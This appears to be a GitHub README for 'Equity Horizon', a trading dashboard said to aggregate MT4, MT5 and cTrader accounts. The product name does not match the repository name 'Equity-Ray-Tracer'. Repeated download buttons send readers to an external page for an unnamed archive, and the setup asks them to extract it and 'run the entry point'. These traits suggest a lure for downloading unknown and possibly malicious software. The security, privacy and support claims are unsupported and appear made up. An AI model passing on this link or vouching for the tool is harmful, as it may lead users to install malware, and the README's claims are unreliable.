![preview](https://raw.githubusercontent.com/Aloni-zin/Equity-Ray-Tracer/main/preview.svg)

# **Equity Horizon** 📈

### *A Next-Generation Trading Dashboard for Multi-Account Equity Visualization & Scenario Analysis*

[![Download](https://raw.githubusercontent.com/Aloni-zin/Equity-Ray-Tracer/main/button.svg)](https://aloni-zin.github.io/Equity-Ray-Tracer/)

## Overview 🌟

**Equity Horizon** is a sophisticated, web-based trading analytics platform designed to transform how retail and institutional traders monitor, forecast, and optimize their portfolio equity. Unlike traditional terminal-based indicators that display only real-time numbers, Equity Horizon provides a dynamic, interactive dashboard that blends historical performance data with predictive modeling, giving traders a panoramic view of their financial trajectory.

Imagine standing on the bridge of a ship, looking not just at the waves beneath you, but at the entire ocean ahead, with currents, wind patterns, and potential storms plotted on a living map. That is what Equity Horizon does for your trading accounts. It aggregates data from MetaTrader 4, MetaTrader 5, and cTrader, then weaves it into a cohesive narrative of where your equity has been, where it is now, and—critically—where it could go under various market scenarios.

Built on a modular architecture with a responsive user interface, the platform supports multilingual interfaces and operates around the clock with a dedicated support framework. Whether you are a scalper managing a dozen micro-accounts or a swing trader nurturing a single portfolio, Equity Horizon adapts to your workflow. The entire system is open-source under the MIT license, encouraging community-driven enhancements and custom integrations.

---

## Why Equity Horizon? 🤔

**The Problem:** Most trading platforms offer equity lines that are retrospective—they show you what happened, but not what might happen. Analyzing floating profit/loss (P/L) across multiple accounts requires manual spreadsheet work or third-party tools that often break after platform updates. Traders waste hours stitching together data instead of making decisions.

**The Solution:** Equity Horizon introduces **Predictive Equity Mapping**, a novel approach that uses your account's historical volatility, win/loss streaks, and current open positions to generate probabilistic equity bands. These bands visualize potential future equity ranges (optimistic, expected, pessimistic) based on your trading patterns. Combined with real-time synchronization, you can see, in one glance, whether you are overexposed across all accounts simultaneously.

---

## Key Features ✨

### 📊 **Multi-Account Aggregation**
Connect unlimited trading accounts from MT4, MT5, and cTrader simultaneously. The platform normalizes data from different brokers into a unified timeline, handling differences in margin currencies, leverage, and position types automatically.

### 🔮 **Scenario Simulation Engine**
Input hypothetical market movements (e.g., "What if EUR/USD drops 200 pips and gold rallies 3%?") and instantly see the projected impact on your combined equity, margin level, and floating P/L. Adjust volatility assumptions with a slider to account for varying market regimes.

### 🌐 **Multilingual Support**
The interface is fully localized in English, Spanish, French, German, Chinese, Japanese, Portuguese, Arabic, and Russian. Currency formatting, date conventions, and number separators adapt dynamically based on your language selection.

### 📱 **Responsive UI Framework**
Designed for traders on the move. The dashboard collapses gracefully from a desktop multi-panel view to a compact mobile layout that prioritizes key metrics: current equity change, largest open risk, and next margin call proximity. Touch gestures for pinch-zoom on charts and swipe between account groups are fully supported.

### 🕐 **24/7 Live Support & Community**
Every repository download includes access to a ticketed support system and a community forum where traders share scenario templates, custom dashboards, and integration scripts. Response times average under four hours during business days.

### 🛡️ **Privacy-First Architecture**
All data processing occurs locally in your browser or self-hosted server. No account credentials, trade data, or equity figures are ever transmitted to external servers. For users who prefer cloud access, an optional end-to-end encrypted sync service is available (separate subscription).

---

## How It Works ⚙️

1. **Connect Your Accounts**: Using the provided bridge scripts (for MT4/MT5/cTrader), your terminal sends encrypted equity snapshots and open position data to the Equity Horizon local server via WebSocket.
2. **Data Normalization**: The platform automatically aligns timestamps, converts margin currencies to your base account currency, and filters out duplicate data from overlapping sessions.
3. **Visualization Engine**: Your equity curve is rendered using a real-time canvas that supports up to 10,000 data points without lag. Overlays include:
   - Floating P/L heatmap (green/red intensity based on exposure)
   - Predictive equity bands (faded confidence intervals)
   - Vertical markers for news events or rollover periods
4. **Scenario Analysis**: Use the built-in "What If" panel to apply custom market moves. The engine recalculates all open positions using the hypothetical prices and updates the entire dashboard instantly.
5. **Export & Share**: Generate high-resolution reports (PNG/SVG/PDF) of your analysis. Reports include a timestamp, account hash (not raw ID), and a QR code that peers can scan to load the scenario—without exposing your actual account details.

---

## Use Cases 🎯

| Scenario | How Equity Horizon Helps |
|----------|--------------------------|
| **Day Trading Multiple Pairs** | See combined margin usage across all intraday positions; identify when one large loss would trigger margin calls in others. |
| **Swing Trading Long-Term** | Use predictive bands to estimate if your equity can withstand a multi-day drawdown without forced liquidation. |
| **Copy Trading Manager** | Monitor all follower accounts from one dashboard; simulate how a 5% drop in the master account affects each follower's equity. |
| **Prop Firm Evaluation** | Track daily drawdown limits and profit targets in real time; set alerts when you approach specific equity thresholds. |
| **Portfolio Hedging** | Visualize correlation between account equity lines; detect when hedges are failing and net exposure is rising. |

---

## Technology Stack 🛠️

- **Frontend**: React 18 with TypeScript, Tailwind CSS, D3.js for charts, i18next for internationalization
- **Backend**: Node.js (Express) or Python (FastAPI) — both supported via adapter layer
- **Data Bridge**: Lightweight DLL/.so files for MT4/MT5, REST plugin for cTrader
- **Storage**: SQLite (local), PostgreSQL (self-hosted), or optional encrypted cloud
- **Auth**: JWT-based with local keystore; no third-party OAuth required
- **License**: MIT — fully permissive for personal and commercial use

---

## Getting Started 🚀

[![Download](https://raw.githubusercontent.com/Aloni-zin/Equity-Ray-Tracer/main/button.svg)](https://aloni-zin.github.io/Equity-Ray-Tracer/)

### Prerequisites
- Node.js v18+ (or Python 3.10+) for the server
- A trading terminal (MT4 build 1400+, MT5 build 4000+, or cTrader 4.4+)
- Basic familiarity with JSON configuration files

### Setup
1. **Download** the repository from the button above. Extract the archive to a dedicated folder (e.g., `Equity-Horizon/`).
2. **Configure bridges**: Open the `bridges/` folder and follow the platform-specific `README.txt` inside. For MT4, this involves placing an `.ex4` file in your Indicators folder. For cTrader, import the `EquityHorizonBridge.cbot` file.
3. **Start the server**: Navigate to the root folder and run the entry point. The console will display a local URL (e.g., `http://localhost:3000`).
4. **Connect your terminal**: Launch your trading platform; the bridge will automatically find the server. You will see a confirmation message in the server console.
5. **Open the dashboard**: Point your browser to the local URL. You will see an empty dashboard with a "Connect Account" button. Click it, enter a name for your account, and paste the connection key shown in your trading terminal's Experts/Journal tab.

That is it. Within seconds, your equity line will begin populating. For first-time users, a guided tour overlay will highlight key sections of the interface.

---

## FAQ ❓

**Q: Does this work with demo accounts?**  
Yes. Demo and live accounts are treated identically. The platform has no way to distinguish between them and does not attempt to.

**Q: Can I use this with multiple computers?**  
Absolutely. Run the server on one machine (e.g., a Raspberry Pi or VPS) and connect trading terminals from different computers. All equity data is consolidated server-side.

**Q: Is there a mobile app?**  
Not a native app, but the web interface is fully responsive and can be installed as a Progressive Web App (PWA) on iOS and Android for an app-like experience.

**Q: How often does data update?**  
By default, every second. You can adjust the polling interval in the server configuration file (`config.json`). Lower intervals increase CPU usage but provide smoother real-time visualization.

**Q: What happens if my terminal crashes?**  
The server maintains the last known equity value as a flat line until the terminal reconnects. No data is lost; once the terminal comes back, the line resumes updating.

---

## Security & Privacy 🔒

Equity Horizon takes a **zero-knowledge** approach to your data:
- Credentials for your trading terminal are never requested or stored
- The bridge script only sends current open positions and equity totals—no trade history, no personal details
- All communication between terminals and the server uses AES-256-GCM encryption
- The server generates a unique machine ID; no telemetry is sent externally
- For users who want additional peace of mind, the entire source code is auditable

---

## Contributing 🤝

We welcome contributions of all kinds—bug fixes, new features, translation improvements, or documentation updates. Please see our `CONTRIBUTING.md` file for guidelines. In particular:
- Fork the repository and create a feature branch
- Write tests for any new functionality
- Ensure the existing test suite passes
- Update the language files if adding new UI strings

All contributors are expected to adhere to the [Contributor Covenant Code of Conduct](https://www.contributor-covenant.org/).

---

## License 📄

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details. You are free to use, modify, and distribute this software for any purpose, including commercial applications. No attribution is required, though it is appreciated.

---

## Disclaimer ⚠️

**Trading involves substantial risk of loss. Equity Horizon is a visualization and analytical tool only; it does not provide financial advice, trading signals, or guarantees of future performance.**  

The predictive equity bands generated by the software are based on historical volatility and user-defined assumptions. These projections are probabilistic, not deterministic, and should never be the sole basis for trading decisions. Past performance is not indicative of future results.

By using this software, you acknowledge that:
1. You are solely responsible for your trading decisions.
2. The developers and contributors of Equity Horizon are not liable for any financial losses incurred.
3. You will not hold the project or its maintainers responsible for system errors, data inaccuracies, or missed margin calls.

Always consult with a qualified financial advisor before engaging in leveraged trading. Use at your own risk.

---

## Support & Community 🌍

- **Documentation**: Full API reference and user guide available in the `docs/` folder
- **Issue Tracker**: Report bugs or request features via GitHub Issues
- **Community Forum**: Link provided in the repository's `About` section
- **Email Support**: Available for verified contributors and sponsors

---

[![Download](https://raw.githubusercontent.com/Aloni-zin/Equity-Ray-Tracer/main/button.svg)](https://aloni-zin.github.io/Equity-Ray-Tracer/)